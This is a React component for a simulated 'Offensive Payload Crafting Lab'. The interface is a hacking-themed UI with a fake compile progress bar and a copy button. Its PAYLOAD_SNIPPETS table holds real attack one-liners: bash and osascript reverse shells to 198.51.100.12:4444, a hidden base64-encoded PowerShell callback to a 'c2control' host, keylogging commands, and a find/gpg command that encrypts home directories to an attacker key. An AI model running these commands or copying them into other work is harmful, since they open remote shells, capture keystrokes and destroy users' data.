import { useState } from "react";
import { FaFlask, FaTerminal, FaCopy, FaCheckCircle, FaCog } from "react-icons/fa";
import { playClick, playSuccess, playKeyboard } from "../../utils/audio";

const PAYLOAD_SNIPPETS = {
  windows: {
    shell: "powershell -NoP -NonI -W Hidden -Enc aG9zdD1jMmNvbnRyb2wuY29tO3BvcnQ9NDQ0NDtzPW5ldy1vYmplY3Qgc3lzdGVtLm5ldC5zb2NrZXRzLnRjcGNsaWVudCgkaG9zdCwkcG9ydCk7...",
    keylogger: "$hook = [Windows.Forms.KeyLg]::Start(); # Listening on active keyboard streams...",
    ransom: "CipherEngine::EncryptWorkspace -Dir 'C:\\Users\\*\\Documents' -Key '0x8F2D...'"
  },
  linux: {
    shell: "bash -i >& /dev/tcp/198.51.100.12/4444 0>&1",
    keylogger: "cat /dev/input/event0 | grep -E 'key press' > /tmp/.kbd_log.tmp",
    ransom: "find /home/ -type f -exec gpg --encrypt --recipient attacker@c2.org {} \\;"
  },
  macos: {
    shell: "osascript -e 'do shell script \"bash -i >& /dev/tcp/198.51.100.12/4444 0>&1\"'",
    keylogger: "log stream --predicate 'eventMessage contains \"keyboard\"' > /tmp/.keys.txt",
    ransom: "tar -czf - /Users/ | openssl enc -aes-256-cbc -salt -out /tmp/backup.tar.enc"
  }
};

export default function PayloadLab() {
  const [platform, setPlatform] = useState("windows");
  const [vector, setVector] = useState("shell");
  const [obfuscation, setObfuscation] = useState("base64");
  const [isCompiling, setIsCompiling] = useState(false);
  const [compileProgress, setCompileProgress] = useState(0);
  const [payloadCode, setPayloadCode] = useState("");
  const [copied, setCopied] = useState(false);

  const handleCompile = () => {
    playClick();
    setIsCompiling(true);
    setPayloadCode("");
    setCompileProgress(0);
    setCopied(false);

    let progress = 0;
    const interval = setInterval(() => {
      progress += Math.floor(Math.random() * 15) + 5;
      playKeyboard();
      if (progress >= 100) {
        clearInterval(interval);
        setIsCompiling(false);
        playSuccess();
        
        // Generate snippet
        const code = PAYLOAD_SNIPPETS[platform]?.[vector] || "";
        setPayloadCode(code);
      } else {
        setCompileProgress(progress);
      }
    }, 200);
  };

  const handleCopyToClipboard = () => {
    playSuccess();
    navigator.clipboard.writeText(payloadCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="card red-card payload-lab-card">
      <div className="card-header">
        <div className="header-left">
          <FaFlask className="header-icon red-text" />
          <h3>Offensive Payload Crafting Lab</h3>
        </div>
      </div>

      <div className="payload-selectors">
        <div className="form-row">
          <div className="form-group half">
            <label>Target Platform OS</label>
            <select 
              value={platform} 
              onChange={e => { playClick(); setPlatform(e.target.value); }}
              disabled={isCompiling}
            >
              <option value="windows">Microsoft Windows Core</option>
              <option value="linux">Linux Kernel Egress</option>
              <option value="macos">Apple macOS Darwin</option>
            </select>
          </div>

          <div className="form-group half">
            <label>Attack Exploit Vector</label>
            <select 
              value={vector} 
              onChange={e => { playClick(); setVector(e.target.value); }}
              disabled={isCompiling}
            >
              <option value="shell">Reverse Shell Connection (TCP)</option>
              <option value="keylogger">Subtle Keylogger Injector</option>
              <option value="ransom">Ransomware File Encryptor Simulation</option>
            </select>
          </div>
        </div>

        <div className="form-group">
          <label>Payload Cipher Encoding</label>
          <div className="depth-selector red-depth">
            {["none", "base64", "xor"].map(o => (
              <button
                key={o}
                className={`depth-btn ${obfuscation === o ? "active" : ""}`}
                onClick={() => { playClick(); setObfuscation(o); }}
                disabled={isCompiling}
              >
                {o.toUpperCase()}
              </button>
            ))}
          </div>
        </div>

        <button 
          className={`compile-btn ${isCompiling ? "compiling" : ""}`}
          onClick={handleCompile}
          disabled={isCompiling}
        >
          {isCompiling ? (
            <>
              <FaCog className="animate-spin" style={{ marginRight: "6px" }} />
              BUILDING EXPLOIT EMBEDDINGS ({compileProgress}%)
            </>
          ) : (
            "COMPILE EXPLOIT PAYLOAD"
          )}
        </button>
      </div>

      {isCompiling && (
        <div className="compiler-console">
          <div className="compiler-line">[INFO] Translating exploit assembly modules...</div>
          {compileProgress > 30 && <div className="compiler-line">[INFO] Injecting shellcode into memory buffers...</div>}
          {compileProgress > 60 && <div className="compiler-line">[INFO] Obfuscating code segments using {obfuscation.toUpperCase()} encoder...</div>}
          {compileProgress > 85 && <div className="compiler-line">[SUCCESS] Executable structure compiled and verified!</div>}
        </div>
      )}

      {payloadCode && !isCompiling && (
        <div className="payload-results animate-fade-in">
          <div className="results-header">
            <span>COMPILED EXPLOIT STRING:</span>
            <button className="copy-btn" onClick={handleCopyToClipboard}>
              {copied ? (
                <>
                  <FaCheckCircle className="green-text" /> COPIED!
                </>
              ) : (
                <>
                  <FaCopy /> COPY COMMAND
                </>
              )}
            </button>
          </div>
          <div className="snippet-display">
            <FaTerminal className="snippet-icon" />
            <pre className="snippet-code">{payloadCode}</pre>
          </div>
          <div className="payload-warning">
            <strong>DISCLAIMER:</strong> This string is an educational simulation. Execute only in authorized sandbox sectors.
          </div>
        </div>
      )}
    </div>
  );
}